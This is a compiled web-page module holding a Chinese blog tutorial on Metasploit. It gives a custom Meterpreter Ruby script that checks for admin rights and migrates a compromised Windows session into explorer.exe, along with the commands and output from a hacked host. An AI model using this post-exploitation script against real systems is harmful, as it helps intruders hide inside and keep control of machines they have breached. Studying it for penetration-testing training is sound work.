import{i as e,r as t,s as n,t as r}from"./app-Cp6W-RnB.js";var i=JSON.parse(`{"path":"/md/hack/tools/2022-05-02-012-Metasploit%E5%88%B6%E4%BD%9C%E5%B9%B6%E8%BF%90%E8%A1%8C%E8%87%AA%E5%AE%9A%E4%B9%89Meterpreper%E8%84%9A%E6%9C%AC.html","title":"Metasploit制作并运行自定义Meterpreper脚本","lang":"zh-CN","frontmatter":{"category":"binghe-code-hack","title":"Metasploit制作并运行自定义Meterpreper脚本","tagline":"by 冰河","tag":["hack","binghe-code-hack"],"excerpt":"Metasploit制作并运行自定义Meterpreper脚本","lock":"need"},"git":{"updatedTime":1777463154000,"contributors":[{"name":"binghe001","username":"binghe001","email":"“1028386804@qq.com”","commits":1,"url":"https://github.com/binghe001"}],"changelog":[{"hash":"0c729a71a0d0cfa76d3882bfe4121a6c63a1e729","time":1777463154000,"email":"“1028386804@qq.com”","author":"binghe001","message":"feature: 升级到vuepress2"}]},"filePathRelative":"md/hack/tools/2022-05-02-012-Metasploit制作并运行自定义Meterpreper脚本.md"}`),a={name:`2022-05-02-012-Metasploit制作并运行自定义Meterpreper脚本.md`};function o(r,i,a,o,s,c){return n(),t(`div`,null,[...i[0]||=[e(`<h1 id="metasploit制作并运行自定义meterpreper脚本" tabindex="-1"><a class="header-anchor" href="#metasploit制作并运行自定义meterpreper脚本"><span>Metasploit制作并运行自定义Meterpreper脚本</span></a></h1><p>注意：运行此脚本的前提是我们已经经过一系列的渗透，成功拿下了Meterpreter命令行。</p><p>这个脚本将会检查我们当前用户是否为管理员用户，然后找到explorer.exe进程，并自动迁移到这个进程中。</p><p>具体脚本mymet.rb如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">##</span>
<span class="line"># Author 冰河</span>
<span class="line"># Date 2019-01-14</span>
<span class="line"># Description Meterpreter脚本实例，检查 我们当前是否为管理员用户，然后找到exeplorer进程，并自动迁移到这个进程中</span>
<span class="line">##</span>
<span class="line">admin_check=is_admin?</span>
<span class="line">if(admin_check)</span>
<span class="line">  print_good(&quot;Current User Is Admin&quot;)</span>
<span class="line">else</span>
<span class="line">  print_error(&quot;Current User Is Not Admin&quot;)</span>
<span class="line">end</span>
<span class="line"></span>
<span class="line">session.sys.process.get_processes().each do |x|</span>
<span class="line">  if x[&#39;name&#39;].downcase == &quot;explorer.exe&quot;</span>
<span class="line">    print_good(&quot;Explorer.exe Process is Running with PID #{x[&#39;pid&#39;]}&quot;)</span>
<span class="line">    explorer_ppid = x[&#39;pid&#39;].to_i</span>
<span class="line">    print_good(&quot;Migrating to Exeplorer.exe at PID #{explorer_ppid.to_s}&quot;)</span>
<span class="line">    session.core.migrate(explorer_ppid)</span>
<span class="line">  end</span>
<span class="line">end</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>接下来，我们将脚本mymet.rb上传到Kali的/usr/share/metasploit-framework/scripts/meterpreter目录下。</p><p>首先，我们现在Meterpreter上执行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; getuid</span>
<span class="line">Server username: NT AUTHORITY\\SYSTEM</span>
<span class="line">meterpreter &gt; </span>
<span class="line">meterpreter &gt; getpid</span>
<span class="line">Current pid: 684</span>
<span class="line">meterpreter &gt; ps</span>
<span class="line"></span>
<span class="line">Process List</span>
<span class="line">============</span>
<span class="line"></span>
<span class="line"> PID   PPID  Name               Arch  Session  User                          Path</span>
<span class="line"> ---   ----  ----               ----  -------  ----                          ----</span>
<span class="line">2208  2168  explorer.exe       x64   1        liuyazhuang-PC\\liuyazhuang    C:\\Windows\\explorer.exe</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到当前的用户是管理员权限，当前session绑定的进程ID是684，explorer进程ID为2208</p><p>接下来我们在Meterpreter命令行下运行如下命令：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">run myset</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>输出如下：</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; run mymet </span>
<span class="line">[+] Current User Is Admin</span>
<span class="line">[+] Explorer.exe Process is Running with PID 2208</span>
<span class="line">[+] Migrating to Exeplorer.exe at PID 2208</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>如下：</p><p><img src="https://img-blog.csdnimg.cn/20190115160713658.png" alt="img"></p><p>可以看到，命令成功运行</p><p>此时我们再次查看当前session绑定的PID</p><div class="language-text line-numbers-mode" data-highlighter="prismjs" data-ext="text"><pre><code class="language-text"><span class="line">meterpreter &gt; getpid</span>
<span class="line">Current pid: 2208</span>
<span class="line"></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div></div></div><p>可以看到当前session已经绑定到explorer.exe进程了。</p><h2 id="写在最后" tabindex="-1"><a class="header-anchor" href="#写在最后"><span>写在最后</span></a></h2><blockquote><p>如果你觉得冰河写的还不错，请微信搜索并关注「 <strong>冰河技术</strong> 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 <strong>冰河技术</strong> 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 <strong>冰河技术</strong> 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 <strong>冰河技术</strong> 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！</p></blockquote><p><img src="https://img-blog.csdnimg.cn/20200906013715889.png" alt=""></p>`,22)]])}var s=r(a,[[`render`,o]]);export{i as _pageData,s as default};